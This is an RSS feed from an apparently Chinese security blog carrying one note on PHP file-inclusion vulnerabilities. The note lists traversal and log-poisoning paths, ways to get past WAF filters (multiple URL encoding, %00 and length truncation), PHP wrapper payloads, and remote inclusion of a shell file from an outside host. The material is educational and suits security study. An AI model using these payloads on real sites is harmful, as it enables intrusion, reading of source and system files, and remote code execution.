<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Khala • Posts by &#34;包含&#34; tag</title>
        <link>https://mobius-0.github.io</link>
        <description>GLHF</description>
        <language>zh-CN</language>
        <pubDate>Sat, 26 Nov 2022 21:02:44 +0800</pubDate>
        <lastBuildDate>Sat, 26 Nov 2022 21:02:44 +0800</lastBuildDate>
        <category>Hexo</category>
        <category>shoya</category>
        <category>网站</category>
        <category>网络安全</category>
        <category>工具</category>
        <category>虚拟机</category>
        <category>安全</category>
        <category>星际争霸2</category>
        <category>平衡</category>
        <category>杂谈</category>
        <category>小说</category>
        <category>江南</category>
        <category>龙族</category>
        <category>动画</category>
        <category>法律法规</category>
        <category>XSS</category>
        <category>漏洞</category>
        <category>渗透测试</category>
        <category>靶场</category>
        <category>pikachu</category>
        <category>标准</category>
        <category>OCI</category>
        <category>CRI</category>
        <category>HTTP</category>
        <category>计算机网络</category>
        <category>IPSec</category>
        <category>VPN</category>
        <category>SSL</category>
        <category>TLS</category>
        <category>WiFi</category>
        <category>邮件</category>
        <category>网络协议</category>
        <category>Linux</category>
        <category>渗透</category>
        <category>信息收集</category>
        <category>痕迹清理</category>
        <category>Windows</category>
        <category>内网</category>
        <category>后门</category>
        <category>免杀</category>
        <category>代理</category>
        <category>Shell</category>
        <category>远程连接</category>
        <category>入侵检测</category>
        <category>IDS</category>
        <category>IPS</category>
        <category>防御加固</category>
        <category>管理策略</category>
        <category>分工</category>
        <category>职能</category>
        <category>情报</category>
        <category>运营</category>
        <category>应急响应</category>
        <category>流程</category>
        <category>攻击溯源</category>
        <category>分析模型</category>
        <category>网络攻防</category>
        <category>蜜罐</category>
        <category>隐藏</category>
        <category>诱导</category>
        <category>防御纵深</category>
        <category>访问控制</category>
        <category>过滤</category>
        <category>框架</category>
        <category>风险</category>
        <category>控制</category>
        <category>CSRF</category>
        <category>服务器</category>
        <category>SQL注入</category>
        <category>SSRF</category>
        <category>Cache</category>
        <category>XXE</category>
        <category>XML</category>
        <category>Xpath</category>
        <category>注入</category>
        <category>函数</category>
        <category>绕过</category>
        <category>遍历</category>
        <category>包含</category>
        <category>文件</category>
        <category>目录</category>
        <category>读取</category>
        <category>上传</category>
        <category>中间件</category>
        <category>IIS</category>
        <category>Apache</category>
        <category>Nginx</category>
        <category>域名</category>
        <category>DNS</category>
        <category>WEB</category>
        <category>虚拟化</category>
        <category>Docker</category>
        <category>镜像</category>
        <category>逻辑</category>
        <category>策略配置</category>
        <category>ASP</category>
        <category>CSharp</category>
        <category>Golang</category>
        <category>Java</category>
        <category>语言</category>
        <category>反序列化</category>
        <category>混淆</category>
        <category>沙箱</category>
        <category>类</category>
        <category>JDK</category>
        <category>开发过程</category>
        <category>JavaScript</category>
        <category>PHP</category>
        <category>PowerShell</category>
        <category>Python</category>
        <category>Ruby</category>
        <category>端口</category>
        <category>社会工程学</category>
        <category>搜索</category>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/</guid>
            <title>文件包含</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/</link>
            <category>包含</category>
            <category>文件</category>
            <category>目录</category>
            <pubDate>Sat, 26 Nov 2022 21:02:44 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础&#34;&gt;#&lt;/a&gt; 基础&lt;/h2&gt;
&lt;p&gt;常见的文件包含漏洞的形式为  &lt;code&gt;&amp;lt;?php include(&amp;quot;inc/&amp;quot; . $_GET[&#39;file&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;考虑常用的几种包含方式为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同目录包含  &lt;code&gt;file=.htaccess&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;目录遍历  &lt;code&gt;?file=../../../../../../../../../var/lib/locate.db&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;日志注入  &lt;code&gt;?file=../../../../../../../../../var/log/apache/error.log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;利用  &lt;code&gt;/proc/self/environ&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试&lt;/p&gt;
&lt;h2 id=&#34;触发sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#触发sink&#34;&gt;#&lt;/a&gt; 触发 Sink&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;PHP
&lt;ul&gt;
&lt;li&gt;include
&lt;ul&gt;
&lt;li&gt;在包含过程中出错会报错，不影响执行后续语句&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;include_once
&lt;ul&gt;
&lt;li&gt;仅包含一次&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;require
&lt;ul&gt;
&lt;li&gt;在包含过程中出错，就会直接退出，不执行后续语句&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;require_once&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h2&gt;
&lt;p&gt;常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式&lt;/p&gt;
&lt;h3 id=&#34;url编码绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url编码绕过&#34;&gt;#&lt;/a&gt; url 编码绕过&lt;/h3&gt;
&lt;p&gt;如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过&lt;/p&gt;
&lt;h3 id=&#34;特殊字符绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊字符绕过&#34;&gt;#&lt;/a&gt; 特殊字符绕过&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;某些情况下，读文件支持使用 Shell 通配符，如  &lt;code&gt;?&lt;/code&gt;   &lt;code&gt;*&lt;/code&gt;  等&lt;/li&gt;
&lt;li&gt;url 中 使用  &lt;code&gt;?&lt;/code&gt;   &lt;code&gt;#&lt;/code&gt;  可能会影响 include 包含的结果&lt;/li&gt;
&lt;li&gt;某些情况下，unicode 编码不同但是字形相近的字符有同一个效果&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;00截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#00截断&#34;&gt;#&lt;/a&gt; %00 截断&lt;/h3&gt;
&lt;p&gt;几乎是最常用的方法，条件是  &lt;code&gt;magic_quotes_gpc&lt;/code&gt;  关闭，而且 php 版本小于 5.3.4。&lt;/p&gt;
&lt;h3 id=&#34;长度截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度截断&#34;&gt;#&lt;/a&gt; 长度截断&lt;/h3&gt;
&lt;p&gt;Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。&lt;/p&gt;
&lt;p&gt;msdn 定义  &lt;code&gt;#define MAX_PATH 260&lt;/code&gt; ，其中第 260 个字符为字符串结尾的  &lt;code&gt;\0&lt;/code&gt;  ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。&lt;/p&gt;
&lt;p&gt;获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX /root 得到 255&lt;/p&gt;
&lt;p&gt;那么在长度有限的时候， &lt;code&gt;././././&lt;/code&gt;  (n 个) 的形式就可以通过这个把路径爆掉&lt;/p&gt;
&lt;p&gt;在 php 代码包含中，这种绕过方式要求 php 版本 &amp;lt; php 5.2.8&lt;/p&gt;
&lt;h3 id=&#34;伪协议绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪协议绕过&#34;&gt;#&lt;/a&gt; 伪协议绕过&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;远程包含：要求  &lt;code&gt;allow_url_fopen=On&lt;/code&gt;  且  &lt;code&gt;allow_url_include=On&lt;/code&gt;  ， payload 为  &lt;code&gt;?file=[http|https|ftp]://websec.wordpress.com/shell.txt&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求  &lt;code&gt;allow_url_include=On&lt;/code&gt;  ，payload 为  &lt;code&gt;?file=php://input&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;Base64: 使用 Base64 伪协议读取文件，payload 为  &lt;code&gt;?file=php://filter/convert.base64-encode/resource=index.php&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;data: 使用 data 伪协议读取文件，payload 为  &lt;code&gt;?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=&lt;/code&gt;  的形式，要求  &lt;code&gt;allow_url_include=On&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;协议绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议绕过&#34;&gt;#&lt;/a&gt; 协议绕过&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;allow_url_fopen&lt;/code&gt;  和  &lt;code&gt;allow_url_include&lt;/code&gt;  主要是针对  &lt;code&gt;http&lt;/code&gt;   &lt;code&gt;ftp&lt;/code&gt;  两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制。&lt;/p&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2R4eS5tZS8/cD03NTI=&#34;&gt;Exploit with PHP Protocols&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGZpLWNoZWF0LXNoZWV0Lw==&#34;&gt;lfi cheat sheet&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
